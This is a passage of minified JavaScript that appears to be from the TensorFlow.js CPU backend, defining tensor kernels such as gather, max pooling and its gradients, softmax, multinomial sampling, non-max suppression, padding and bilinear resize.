                const g = m;
                m = ir({
                    inputs: {
                        a: m,
                        b: i
                    },
                    backend: e
                }),
                e.disposeIntermediateTensorInfo(g)
            }
            if (p) {
                const g = m;
                m = gl(e, m, p, a, f),
                e.disposeIntermediateTensorInfo(g)
            }
            return m
        }
    };
    const sD = {
        kernelName: If,
        backendName: "cpu",
        kernelFunc: function nD(n) {
            const {inputs: t, backend: e} = n
              , {params: s, indices: o} = t
              , r = Z(s.shape)
              , i = o.shape
              , a = i[i.length - 1]
              , [c,l,u,d] = Jd(s, o);
            if (0 === l)
                return e.makeTensorInfo(c, s.dtype, []);
            const f = oy(e.data.get(o.dataId).values, e.bufferSync(s), s.dtype, l, a, u, d, s.shape, r);
            return e.makeTensorInfo(c, s.dtype, f.values)
        }
    };
    const rD = {
        kernelName: Fa,
        backendName: "cpu",
        kernelFunc: function oD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, indices: r} = t
              , {axis: i, batchDims: a} = s;
            it([o, r], "gatherV2");
            const c = It(i, o.shape)[0]
              , l = e.data.get(r.dataId).values
              , u = o.shape[c];
            for (let y = 0; y < l.length; ++y) {
                const w = l[y];
                v(w <= u - 1 && w >= 0, (()=>`GatherV2: the index value ${w} is not in [0, ${u - 1}]`))
            }
            let d = a;
            null == a && (d = 0);
            const h = Z(r.shape)
              , p = Sh(o, r, c, d)
              , f = At({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    shape: [p.batchSize, p.outerSize, p.dimSize, p.sliceSize]
                }
            })
              , m = At({
                inputs: {
                    x: r
                },
                backend: e,
                attrs: {
                    shape: [p.batchSize, h / p.batchSize]
                }
            })
              , g = [p.batchSize, p.outerSize, h / p.batchSize, p.sliceSize]
              , b = e.bufferSync(m)
              , I = ry(e.bufferSync(f), b, g);
            return e.disposeIntermediateTensorInfo(f),
            e.disposeIntermediateTensorInfo(m),
            e.makeTensorInfo(p.outputShape, I.dtype, I.values)
        }
    };
    const aD = {
        kernelName: Tu,
        backendName: "cpu",
        kernelFunc: function iD(n) {
            const {inputs: t, backend: e} = n
              , {input: s} = t
              , o = Z(s.shape)
              , r = s.shape[s.shape.length - 1]
              , a = At({
                inputs: {
                    x: s
                },
                backend: e,
                attrs: {
                    shape: [o / r, r]
                }
            })
              , c = jy(a, !0, e)
              , l = At({
                inputs: {
                    x: c
                },
                backend: e,
                attrs: {
                    shape: s.shape
                }
            });
            return e.disposeIntermediateTensorInfo(a),
            e.disposeIntermediateTensorInfo(c),
            l
        }
    }
      , cD = Et(Zr, (n=>Number.isFinite(n) ? 1 : 0), "bool")
      , lD = {
        kernelName: Zr,
        backendName: "cpu",
        kernelFunc: cD
    }
      , uD = Et(Br, (n=>Math.abs(n) === 1 / 0 ? 1 : 0), "bool")
      , dD = {
        kernelName: Br,
        backendName: "cpu",
        kernelFunc: uD
    }
      , hD = Et(Hr, (n=>Number.isNaN(n) ? 1 : 0), "bool")
      , pD = {
        kernelName: Hr,
        backendName: "cpu",
        kernelFunc: hD
    };
    const mD = {
        kernelName: wf,
        backendName: "cpu",
        kernelFunc: function fD(n) {
            const {backend: t, attrs: e} = n
              , {start: s, stop: o, num: r} = e
              , i = uy(s, o, r);
            return t.makeTensorInfo([i.length], "float32", i)
        }
    }
      , gD = Et(Ur, (n=>Math.log1p(n)))
      , bD = {
        kernelName: Ur,
        backendName: "cpu",
        kernelFunc: gD
    }
      , xD = oe(((n,t)=>n && t))
      , yD = pe(Oa, xD, null, "bool")
      , ID = {
        kernelName: Oa,
        backendName: "cpu",
        kernelFunc: yD
    }
      , wD = Et(Ka, (n=>n ? 0 : 1), "bool")
      , CD = {
        kernelName: Ka,
        backendName: "cpu",
        kernelFunc: wD
    }
      , vD = oe(((n,t)=>n || t))
      , SD = pe(Za, vD, null, "bool")
      , kD = {
        kernelName: Za,
        backendName: "cpu",
        kernelFunc: SD
    };
    const ND = {
        kernelName: Ba,
        backendName: "cpu",
        kernelFunc: function TD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {depthRadius: r, bias: i, alpha: a, beta: c} = s;
            it(o, "LRN");
            const l = o.shape[3]
              , u = l - 1
              , d = e.data.get(o.dataId).values
              , h = Z(o.shape)
              , p = new Float32Array(h);
            function f(m) {
                const g = m % l;
                let b = m - g + Math.max(0, g - r);
                const x = m - g + Math.min(g + r, u);
                let I = 0;
                for (; b <= x; b++) {
                    const y = d[b];
                    I += y * y
                }
                return I
            }
            for (let m = 0; m < h; m++) {
                const g = f(m)
                  , b = d[m] * Math.pow(i + a * g, -c);
                p[m] = b
            }
            return e.makeTensorInfo(o.shape, o.dtype, p)
        }
    };
    const $D = {
        kernelName: Ru,
        backendName: "cpu",
        kernelFunc: function RD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, y: r, dy: i} = t
              , {depthRadius: a, bias: c, alpha: l, beta: u} = s;
            it(i, "LRNGrad");
            const d = Z(i.shape)
              , h = i.shape[3]
              , p = e.data.get(i.dataId).values
              , f = e.data.get(o.dataId).values
              , m = e.data.get(r.dataId).values
              , g = new Float32Array(d)
              , b = d;
            for (let x = 0; x < b; x++) {
                const I = x % h
                  , y = x - I + Math.max(0, I - a)
                  , w = x - I + Math.min(h, I + a + 1);
                let C = 0;
                for (let k = y; k < w; k++)
                    C += Math.pow(f[k], 2);
                C = l * C + c;
                for (let k = y; k < w; k++) {
                    let S = -2 * l * u * f[k] * m[x] / C;
                    x === k && (S += Math.pow(C, -u)),
                    S *= p[x],
                    g[k] += S
                }
            }
            return e.makeTensorInfo(i.shape, o.dtype, g)
        }
    };
    function qy(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {reductionIndices: r, keepDims: i} = s
          , a = e;
        let c = o.shape;
        const l = c.length
          , u = It(r, c);
        let d = u;
        const h = Yt(d, l);
        let p = a.data.get(o.dataId).values;
        if (null != h) {
            const y = new Array(l);
            for (let w = 0; w < y.length; w++)
                y[w] = c[h[w]];
            p = hp(p, c, o.dtype, h, y),
            d = ee(d.length, l),
            c = y
        }
        it(o, "max"),
        Ie("max", d, l);
        const [f,m] = me(c, d)
          , b = hy(p, Z(m), f, o.dtype)
          , x = a.write(b, f, o.dtype);
        let I = f;
        return i && (I = re(f, u)),
        {
            dataId: x,
            shape: I,
            dtype: o.dtype
        }
    }
    const GD = {
        kernelName: Ha,
        backendName: "cpu",
        kernelFunc: qy
    };
    const ED = {
        kernelName: _a,
        backendName: "cpu",
        kernelFunc: function LD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t;
            it(o, "maxPool");
            const {filterSize: r, strides: i, pad: a, dimRoundingMode: c} = s;
            v(Te(i, 1), (()=>`Error in maxPool: Either strides or dilations must be 1. Got strides ${i} and dilations '1'`));
            const u = pn(o.shape, r, i, 1, a, c);
            let d;
            if (1 === u.filterWidth && 1 === u.filterHeight && Rt(u.inShape, u.outShape))
                d = Qn({
                    inputs: {
                        x: o
                    },
                    backend: e
                });
            else {
                const h = e.data.get(o.dataId).values
                  , p = ct(o.shape)
                  , f = mp(h, o.shape, o.dtype, p, u, "max");
                d = e.makeTensorInfo(u.outShape, o.dtype, f.values)
            }
            return d
        }
    };
    const WD = {
        kernelName: Ua,
        backendName: "cpu",
        kernelFunc: function DD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {filterSize: r, strides: i, pad: a, dimRoundingMode: c, dataFormat: l} = s;
            it(o, "maxPool3d");
            const u = ss(o.shape, r, i, 1, a, c, l)
              , h = Yy(e.data.get(o.dataId).values, o.shape, o.dtype, ct(o.shape), u, "max");
            return e.makeTensorInfo(h.shape, "float32", h.values)
        }
    };
    const VD = {
        kernelName: Gu,
        backendName: "cpu",
        kernelFunc: function MD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, input: r} = t
              , {filterSize: i, strides: a, pad: c, dimRoundingMode: l} = s;
            it([o, r], "maxPool3DGrad");
            const u = ss(r.shape, i, a, 1, c, l)
              , h = function SE(n, t) {
                const e = wt(t.outShape, "int32")
                  , s = t.strideDepth
                  , o = t.strideHeight
                  , r = t.strideWidth
                  , i = t.dilationDepth
                  , a = t.dilationHeight
                  , c = t.dilationWidth
                  , l = t.effectiveFilterDepth
                  , u = t.effectiveFilterHeight
                  , d = t.effectiveFilterWidth
                  , h = t.padInfo.front
                  , p = t.padInfo.top
                  , f = t.padInfo.left;
                for (let m = 0; m < t.batchSize; ++m)
                    for (let g = 0; g < t.inChannels; ++g)
                        for (let b = 0; b < t.outDepth; ++b) {
                            const x = b * s - h;
                            let I = x;
                            for (; I < 0; )
                                I += i;
                            const y = Math.min(t.inDepth, l + x);
                            for (let w = 0; w < t.outHeight; ++w) {
                                const C = w * o - p;
                                let k = C;
                                for (; k < 0; )
                                    k += a;
                                const S = Math.min(t.inHeight, u + C);
                                for (let T = 0; T < t.outWidth; ++T) {
                                    const R = T * r - f;
                                    let L = R;
                                    for (; L < 0; )
                                        L += c;
                                    const V = Math.min(t.inWidth, d + R);
                                    let F = Number.NEGATIVE_INFINITY
                                      , X = -1;
                                    for (let A = I; A < y; A += i) {
                                        const P = A - x;
                                        for (let B = k; B < S; B += a) {
                                            const K = B - C;
                                            for (let H = L; H < V; H += c) {
                                                const U = H - R
                                                  , Y = n.get(m, A, B, H, g);
                                                Y >= F && (F = Y,
                                                X = P * u * d + K * u + U)
                                            }
                                        }
                                    }
                                    e.set(X, m, b, w, T, g)
                                }
                            }
                        }
                return e
            }(e.bufferSync(r), u)
              , p = u.strideDepth
              , f = u.strideHeight
              , m = u.strideWidth
              , g = u.dilationDepth
              , b = u.dilationHeight
              , x = u.dilationWidth
              , I = u.effectiveFilterDepth
              , y = u.effectiveFilterHeight
              , w = u.effectiveFilterWidth
              , C = I - 1 - u.padInfo.front
              , k = w - 1 - u.padInfo.left
              , S = y - 1 - u.padInfo.top
              , T = wt(r.shape, "float32")
              , R = e.bufferSync(o);
            for (let L = 0; L < u.batchSize; ++L)
                for (let V = 0; V < u.inChannels; ++V)
                    for (let F = 0; F < u.inDepth; ++F)
                        for (let X = 0; X < u.inHeight; ++X)
                            for (let A = 0; A < u.inWidth; ++A) {
                                const P = F - C
                                  , B = X - S
                                  , K = A - k;
                                let H = 0;
                                for (let U = 0; U < I; U += g) {
                                    const Y = (P + U) / p;
                                    if (!(Y < 0 || Y >= u.outDepth || Math.floor(Y) !== Y))
                                        for (let j = 0; j < y; j += b) {
                                            const J = (B + j) / f;
                                            if (!(J < 0 || J >= u.outHeight || Math.floor(J) !== J))
                                                for (let nt = 0; nt < w; nt += x) {
                                                    const q = (K + nt) / m;
                                                    if (q < 0 || q >= u.outWidth || Math.floor(q) !== q)
                                                        continue;
                                                    const ft = I * y * w - 1 - h.get(L, Y, J, q, V) === U * y * w + j * w + nt ? 1 : 0;
                                                    if (0 === ft)
                                                        continue;
                                                    H += R.get(L, Y, J, q, V) * ft
                                                }
                                        }
                                }
                                T.set(H, L, F, X, A, V)
                            }
            return e.makeTensorInfo(T.shape, T.dtype, T.values)
        }
    };
    const zD = {
        kernelName: $u,
        backendName: "cpu",
        kernelFunc: function FD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, input: r, output: i} = t
              , a = r;
            it([r, i], "maxPoolGrad");
            const {filterSize: c, strides: l, pad: u, dimRoundingMode: d} = s
              , h = pn(a.shape, c, l, 1, u, d)
              , p = e.data.get(a.dataId).values
              , f = wt(h.outShape, a.dtype, Uy(p, a.shape, a.dtype, h).values)
              , m = h.strideHeight
              , g = h.strideWidth
              , b = h.dilationHeight
              , x = h.dilationWidth
              , I = h.effectiveFilterHeight
              , y = h.effectiveFilterWidth
              , w = y - 1 - h.padInfo.left
              , C = I - 1 - h.padInfo.top
              , k = wt(a.shape, "float32")
              , S = e.data.get(o.dataId).values
              , T = wt(o.shape, "float32", S);
            for (let R = 0; R < h.batchSize; ++R)
                for (let L = 0; L < h.inChannels; ++L)
                    for (let V = 0; V < h.inHeight; ++V)
                        for (let F = 0; F < h.inWidth; ++F) {
                            const X = V - C
                              , A = F - w;
                            let P = 0;
                            for (let B = 0; B < I; B += b) {
                                const K = (X + B) / m;
                                if (!(K < 0 || K >= h.outHeight || Math.floor(K) !== K))
                                    for (let H = 0; H < y; H += x) {
                                        const U = (A + H) / g;
                                        if (U < 0 || U >= h.outWidth || Math.floor(U) !== U)
                                            continue;
                                        const J = I * y - 1 - f.get(R, K, U, L) === B * y + H ? 1 : 0;
                                        if (0 === J)
                                            continue;
                                        P += T.get(R, K, U, L) * J
                                    }
                            }
                            k.set(P, R, V, F, L)
                        }
            return e.makeTensorInfo(k.shape, k.dtype, k.values)
        }
    };
    const AD = {
        kernelName: Cf,
        backendName: "cpu",
        kernelFunc: ({inputs: n, attrs: t, backend: e})=>{
            const {x: s} = n
              , {filterSize: o, strides: r, pad: i, includeBatchInIndex: a} = t
              , c = e;
            it(s, "MaxPoolWithArgmax");
            const l = c.data.get(s.dataId).values
              , u = pn(s.shape, o, r, [1, 1], i)
              , [d,h] = function XD(n, t, e, s, o) {
                const i = mp(n, 0, e, ct(t), o, "max")
                  , a = Uy(n, t, e, o, !0, s);
                return [i.values, a.values]
            }(l, s.shape, s.dtype, a, u)
              , p = c.write(d, u.outShape, s.dtype)
              , f = c.write(h, u.outShape, s.dtype);
            return [{
                dataId: p,
                shape: u.outShape,
                dtype: s.dtype
            }, {
                dataId: f,
                shape: u.outShape,
                dtype: "int32"
            }]
        }
    };
    const OD = {
        kernelName: Ya,
        backendName: "cpu",
        kernelFunc: function PD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, keepDims: i} = s
              , a = It(r, o.shape)
              , u = Z(me(o.shape, a)[1])
              , d = []
              , h = e.makeTensorInfo([], "float32", new Float32Array([u]));
            d.push(h);
            const p = Ws({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    dtype: "float32"
                }
            });
            d.push(p);
            const f = gp({
                inputs: {
                    a: p,
                    b: h
                },
                backend: e
            });
            d.push(f);
            const m = ea({
                inputs: {
                    x: f
                },
                backend: e,
                attrs: {
                    axis: r,
                    keepDims: i
                }
            });
            return d.forEach((g=>e.disposeIntermediateTensorInfo(g))),
            m
        }
    };
    const ZD = {
        kernelName: Qa,
        backendName: "cpu",
        kernelFunc: function KD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, keepDims: i} = s;
            it(o, "min");
            const a = It(r, o.shape);
            let c = a;
            const l = Yt(c, o.shape.length);
            let u = o;
            null != l && (u = Ke({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: l
                }
            }),
            c = ee(c.length, o.shape.length)),
            Ie("min", c, u.shape.length);
            const [d,h] = me(u.shape, c)
              , p = Z(h)
              , f = ke(Z(d), u.dtype)
              , m = e.data.get(u.dataId).values;
            for (let b = 0; b < f.length; ++b) {
                const x = b * p;
                let I = m[x];
                for (let y = 0; y < p; ++y) {
                    const w = m[x + y];
                    (Number.isNaN(w) || w < I) && (I = w)
                }
                f[b] = I
            }
            null != l && e.disposeIntermediateTensorInfo(u);
            const g = e.makeTensorInfo(d, u.dtype, f);
            if (i) {
                const x = At({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: re(d, a)
                    }
                });
                return e.disposeIntermediateTensorInfo(g),
                x
            }
            return g
        }
    };
    const HD = {
        kernelName: Ja,
        backendName: "cpu",
        kernelFunc: function BD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {paddings: r, mode: i} = s;
            it(o, "mirrorPad");
            const a = r.map(((I,y)=>I[0] + o.shape[y] + I[1]))
              , c = r.map((I=>I[0]))
              , l = r.map(((I,y)=>I[0] + o.shape[y]))
              , u = "reflect" === i ? 0 : 1
              , d = e.data.get(o.dataId).values
              , h = o.shape.length
              , p = ct(o.shape)
              , f = Z(a)
              , m = a.length
              , g = ct(a)
              , b = Se(o.dtype, f);
            for (let I = 0; I < f; I++) {
                let y = Vo(I, m, g);
                for (let C = 0; C < m; C++)
                    y[C] < c[C] ? y[C] = 2 * c[C] - y[C] - u : y[C] >= l[C] && (y[C] = 2 * (l[C] - 1) - y[C] + u);
                y = y.map(((C,k)=>C - c[k]));
                const w = Fn(y, h, p);
                b[I] = d[w]
            }
            return {
                dataId: e.write(b, a, o.dtype),
                shape: a,
                dtype: o.dtype
            }
        }
    }
      , _D = oe(((n,t)=>{
        const e = n % t;
        return n < 0 && t < 0 || n >= 0 && t >= 0 ? e : (e + t) % t
    }
    ))
      , UD = pe(Jr, _D)
      , YD = {
        kernelName: Jr,
        backendName: "cpu",
        kernelFunc: UD
    };
    function t1(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {logits: o} = t
          , {dim: r} = s
          , i = o.shape.length;
        let a = r;
        if (-1 === a && (a = i - 1),
        a !== i - 1)
            throw Error(`Softmax along a non-last dimension is not yet supported. Logits was rank ${i} and dim was ${a}`);
        const c = It([a], o.shape)
          , l = qy({
            inputs: {
                x: o
            },
            backend: e,
            attrs: {
                reductionIndices: c,
                keepDims: !1
            }
        })
          , u = re(l.shape, c)
          , d = At({
            inputs: {
                x: l
            },
            backend: e,
            attrs: {
                shape: u
            }
        })
          , h = fp({
            inputs: {
                a: o,
                b: d
            },
            backend: e
        })
          , p = ty({
            inputs: {
                x: h
            },
            backend: e
        })
          , f = ea({
            inputs: {
                x: p
            },
            backend: e,
            attrs: {
                axis: c,
                keepDims: !1
            }
        })
          , m = At({
            inputs: {
                x: f
            },
            backend: e,
            attrs: {
                shape: u
            }
        })
          , g = gp({
            inputs: {
                a: p,
                b: m
            },
            backend: e
        });
        return e.disposeIntermediateTensorInfo(l),
        e.disposeIntermediateTensorInfo(d),
        e.disposeIntermediateTensorInfo(h),
        e.disposeIntermediateTensorInfo(p),
        e.disposeIntermediateTensorInfo(f),
        e.disposeIntermediateTensorInfo(m),
        g
    }
    const QD = {
        kernelName: mc,
        backendName: "cpu",
        kernelFunc: t1
    };
    const jD = {
        kernelName: vf,
        backendName: "cpu",
        kernelFunc: function JD(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {logits: o} = t
              , {numSamples: r, seed: i, normalized: a} = s;
            it(o, "multinomial");
            const c = a ? o : t1({
                inputs: {
                    logits: o
                },
                backend: e,
                attrs: {
                    dim: -1
                }
            })
              , l = c.shape[0]
              , u = c.shape[1]
              , d = e.data.get(c.dataId).values
              , h = [l, r]
              , p = ke(Z(h), "int32");
            for (let f = 0; f < l; ++f) {
                const m = f * u
                  , g = new Float32Array(u - 1);
                g[0] = d[m];
                for (let I = 1; I < g.length; ++I)
                    g[I] = g[I - 1] + d[m + I];
                const b = Md.alea(i.toString())
                  , x = f * r;
                for (let I = 0; I < r; ++I) {
                    const y = b();
                    p[x + I] = g.length;
                    for (let w = 0; w < g.length; w++)
                        if (y < g[w]) {
                            p[x + I] = w;
                            break
                        }
                }
            }
            return a || e.disposeIntermediateTensorInfo(c),
            e.makeTensorInfo(h, "int32", p)
        }
    }
      , qD = Hd;
    const eW = {
        kernelName: Lu,
        backendName: "cpu",
        kernelFunc: function tW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {boxes: o, scores: r} = t
              , {maxOutputSize: i, iouThreshold: a, scoreThreshold: c} = s;
            it(o, "NonMaxSuppression");
            const l = e.data.get(o.dataId).values
              , u = e.data.get(r.dataId).values
              , {selectedIndices: d} = qD(l, u, i, a, c);
            return e.makeTensorInfo([d.length], "int32", new Int32Array(d))
        }
    }
      , nW = _d;
    const oW = {
        kernelName: Eu,
        backendName: "cpu",
        kernelFunc: function sW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {boxes: o, scores: r} = t
              , {maxOutputSize: i, iouThreshold: a, scoreThreshold: c, padToMaxOutputSize: l} = s;
            it(o, "NonMaxSuppressionPadded");
            const u = e.data.get(o.dataId).values
              , d = e.data.get(r.dataId).values
              , {selectedIndices: h, validOutputs: p} = nW(u, d, i, a, c, l);
            return [e.makeTensorInfo([h.length], "int32", new Int32Array(h)), e.makeTensorInfo([], "int32", new Int32Array([p]))]
        }
    }
      , rW = Ud;
    const aW = {
        kernelName: Du,
        backendName: "cpu",
        kernelFunc: function iW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {boxes: o, scores: r} = t
              , {maxOutputSize: i, iouThreshold: a, scoreThreshold: c, softNmsSigma: l} = s;
            it(o, "NonMaxSuppressionWithScore");
            const u = e.data.get(o.dataId).values
              , d = e.data.get(r.dataId).values
              , h = i
              , p = a
              , f = c
              , m = l
              , {selectedIndices: g, selectedScores: b} = rW(u, d, h, p, f, m);
            return [e.makeTensorInfo([g.length], "int32", new Int32Array(g)), e.makeTensorInfo([b.length], "float32", new Float32Array(b))]
        }
    };
    const lW = {
        kernelName: ec,
        backendName: "cpu",
        kernelFunc: function cW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {indices: o} = t
              , {dtype: r, depth: i, onValue: a, offValue: c} = s;
            it(o, "oneHot");
            const l = Z(o.shape)
              , u = new Float32Array(l * i);
            u.fill(c);
            const d = e.data.get(o.dataId).values;
            for (let h = 0; h < l; ++h)
                d[h] >= 0 && d[h] < i && (u[h * i + d[h]] = a);
            return e.makeTensorInfo([...o.shape, i], r, u)
        }
    };
    function xl(n) {
        const {inputs: t, backend: e} = n
          , {x: s} = t;
        if ("string" === s.dtype)
            throw new Error("zerosLike is not supported for string tensors");
        if ("complex64" === s.dtype) {
            const o = yo({
                inputs: {
                    input: s
                },
                backend: e
            })
              , r = xl({
                inputs: {
                    x: o
                },
                backend: e
            })
              , i = ar({
                inputs: {
                    input: s
                },
                backend: e
            })
              , a = xl({
                inputs: {
                    x: i
                },
                backend: e
            })
              , c = Qe({
                inputs: {
                    real: r,
                    imag: a
                },
                backend: e
            });
            return e.disposeIntermediateTensorInfo(o),
            e.disposeIntermediateTensorInfo(r),
            e.disposeIntermediateTensorInfo(i),
            e.disposeIntermediateTensorInfo(a),
            c
        }
        return yp({
            backend: e,
            attrs: {
                shape: s.shape,
                value: 0,
                dtype: s.dtype
            }
        })
    }
    const uW = {
        kernelName: xc,
        backendName: "cpu",
        kernelFunc: xl
    };
    const dW = {
        kernelName: tc,
        backendName: "cpu",
        kernelFunc: function e1(n) {
            const {inputs: t, backend: e} = n
              , {x: s} = t;
            if ("string" === s.dtype)
                throw new Error("onesLike is not supported for string tensors");
            if ("complex64" === s.dtype) {
                const o = yo({
                    inputs: {
                        input: s
                    },
                    backend: e
                })
                  , r = e1({
                    inputs: {
                        x: o
                    },
                    backend: e
                })
                  , i = ar({
                    inputs: {
                        input: s
                    },
                    backend: e
                })
                  , a = xl({
                    inputs: {
                        x: i
                    },
                    backend: e
                })
                  , c = Qe({
                    inputs: {
                        real: r,
                        imag: a
                    },
                    backend: e
                });
                return e.disposeIntermediateTensorInfo(o),
                e.disposeIntermediateTensorInfo(r),
                e.disposeIntermediateTensorInfo(i),
                e.disposeIntermediateTensorInfo(a),
                c
            }
            return yp({
                backend: e,
                attrs: {
                    shape: s.shape,
                    value: 1,
                    dtype: s.dtype
                }
            })
        }
    };
    function n1(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {axis: o} = s;
        if (1 === t.length)
            return bl({
                inputs: {
                    input: t[0]
                },
                backend: e,
                attrs: {
                    dim: o
                }
            });
        const r = t[0].shape
          , i = t[0].dtype;
        t.forEach((u=>{
            Hl(r, u.shape, "All tensors passed to stack must have matching shapes"),
            v(i === u.dtype, (()=>"All tensors passed to stack must have matching dtypes"))
        }
        ));
        const a = []
          , l = cr({
            inputs: t.map((u=>{
                const d = bl({
                    inputs: {
                        input: u
                    },
                    backend: e,
                    attrs: {
                        dim: o
                    }
                });
                return a.push(d),
                d
            }
            )),
            backend: e,
            attrs: {
                axis: o
            }
        });
        return a.forEach((u=>e.disposeIntermediateTensorInfo(u))),
        l
    }
    const hW = {
        kernelName: nc,
        backendName: "cpu",
        kernelFunc: n1
    };
    const s1 = {
        kernelName: sc,
        backendName: "cpu",
        kernelFunc: function pW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {paddings: r, constantValue: i} = s;
            it(o, "pad");
            const a = r.map(((x,I)=>x[0] + o.shape[I] + x[1]))
              , c = r.map((x=>x[0]))
              , l = e.data.get(o.dataId).values
              , u = Z(o.shape)
              , d = o.shape.length
              , h = ct(o.shape)
              , p = Z(a)
              , f = a.length
              , m = ct(a)
              , g = Se(o.dtype, p);
            0 !== i && g.fill(i);
            for (let x = 0; x < u; x++) {
                g[Fn(Vo(x, d, h).map(((C,k)=>C + c[k])), f, m)] = l[x]
            }
            return {
                dataId: e.write(g, a, o.dtype),
                shape: a,
                dtype: o.dtype
            }
        }
    }
      , fW = oe(((n,t)=>Math.pow(n, t)))
      , mW = pe(qr, fW)
      , gW = {
        kernelName: qr,
        backendName: "cpu",
        kernelFunc: mW
    };
    const xW = {
        kernelName: Sf,
        backendName: "cpu",
        kernelFunc: function bW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {paramsNestedSplits: o, paramsDenseValues: r, indices: i} = t
              , a = o.map((g=>e.data.get(g.dataId).values))
              , c = o.map((g=>g.shape))
              , l = e.data.get(r.dataId).values
              , u = e.data.get(i.dataId).values
              , [d,h,p] = yy(a, c, l, r.shape, r.dtype, u, i.shape)
              , f = d.map((g=>e.makeTensorInfo([g.length], "int32", g)))
              , m = e.makeTensorInfo(p, r.dtype, h);
            return f.concat([m])
        }
    };
    const IW = {
        kernelName: kf,
        backendName: "cpu",
        kernelFunc: function yW(n) {
            const {inputs: t, backend: e} = n
              , {starts: s, limits: o, deltas: r} = t
              , i = e.data.get(s.dataId).values
              , a = e.data.get(o.dataId).values
              , c = e.data.get(r.dataId).values
              , [l,u] = wy(i, s.shape, s.dtype, a, o.shape, c, r.shape);
            return [e.makeTensorInfo([l.length], "int32", l), e.makeTensorInfo([u.length], s.dtype, u)]
        }
    };
    const CW = {
        kernelName: Tf,
        backendName: "cpu",
        kernelFunc: function wW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {shape: o, values: r, defaultValue: i, rowPartitionTensors: a} = t
              , {rowPartitionTypes: c} = s
              , l = e.data.get(o.dataId).values
              , u = e.data.get(r.dataId).values
              , d = e.data.get(i.dataId).values
              , h = a.map((g=>e.data.get(g.dataId).values))
              , p = a.map((g=>g.shape))
              , [f,m] = Sy(l, o.shape, u, r.shape, r.dtype, d, i.shape, h, p, c);
            return e.makeTensorInfo(f, r.dtype, m)
        }
    };
    const SW = {
        kernelName: Wu,
        backendName: "cpu",
        kernelFunc: function vW(n) {
            const {backend: t, attrs: e} = n
              , {start: s, stop: o, dtype: r, step: i} = e
              , a = ky(s, o, i, r);
            return t.makeTensorInfo([a.length], r, a)
        }
    }
      , kW = Et(ti, (n=>1 / n))
      , TW = {
        kernelName: ti,
        backendName: "cpu",
        kernelFunc: kW
    };
    const RW = {
        kernelName: cc,
        backendName: "cpu",
        kernelFunc: function NW(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {images: o} = t
              , {alignCorners: r, halfPixelCenters: i, size: a} = s;
            it(o, "resizeBilinear");
            const c = ct(o.shape)
              , [l,u] = a
              , [d,h,p,f] = o.shape
              , m = e.data.get(o.dataId).values
              , g = new Float32Array(Z([d, l, u, f]))
              , b = [r && l > 1 ? h - 1 : h, r && u > 1 ? p - 1 : p]
              , x = [r && l > 1 ? l - 1 : l, r && u > 1 ? u - 1 : u];
            let I = 0;
            const y = b[0] / x[0]
              , w = b[1] / x[1];
            for (let C = 0; C < d; C++)
                for (let k = 0; k < l; k++) {
                    let S;
                    S = i ? y * (k + .5) - .5 : y * k;
                    const T = Math.max(0, Math.floor(S))
                      , R = S - T
                      , L = Math.min(h - 1, Math.ceil(S))
                      , V = C * c[0] + T * c[1]
                      , F = C * c[0] + L * c[1];
                    for (let X = 0; X < u; X++) {
                        let A;
                        A = i ? w * (X + .5) - .5 : w * X;
                        const P = Math.max(0, Math.floor(A))
                          , B = A - P
                          , K = Math.min(p - 1, Math.ceil(A))
                          , H = V + P * c[2]
                          , U = F + P * c[2]
                          , Y = V + K * c[2]
                          , j = F + K * c[2];
                        for (let J = 0; J < f; J++) {
                            const nt = m[H + J]
                              , q = m[U + J]
                              , ft = nt + (m[Y + J] - nt) * B
                              , xt = ft + (q + (m[j + J] - q) * B - ft) * R;
                            g[I++] = xt
                        }
                    }
                }
            return e.makeTensorInfo([d, l, u, f], "float32", g)
        }
    };
    const GW = {
        kernelName: Fu,
        backendName: "cpu",
        kernelFunc: function $W(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {images: o, dy: r} = t
              , {alignCorners: i} = s;
            it([r, o], "resizeBilinearGrad");
            const a = ct(o.shape)
              , [c,l,u,d] = o.shape
              , [,h,p] = r.shape
              , f = new Float32Array(c * l * u * d)
              , m = [i && h > 1 ? l - 1 : l, i && p > 1 ? u - 1 : u]
              , g = [i && h > 1 ? h - 1 : h, i && p > 1 ? p - 1 : p]
              , b = m[0] / g[0]
              , x = m[1] / g[1]
              , I = e.data.get(r.dataId).values;
            let y = 0;
            for (let w = 0; w < c; w++) {
                const C = w * a[0];
                for (let k = 0; k < h; k++) {
                    const S = k * b
                      , T = Math.floor(S)
                      , R = Math.min(Math.ceil(S), l - 1)
                      , L = C + T * a[1]
                      , V = C + R * a[1]
                      , F = S - T
                      , X = 1 - F;
                    for (let A = 0; A < p; A++) {
                        const P = A * x
                          , B = Math.floor(P)
                          , K = Math.min(Math.ceil(P), u - 1)
                          , H = P - B
                          , U = 1 - H
                          , Y = L + B * a[2]
                          , j = L + K * a[2]
                          , J = V + B * a[2]
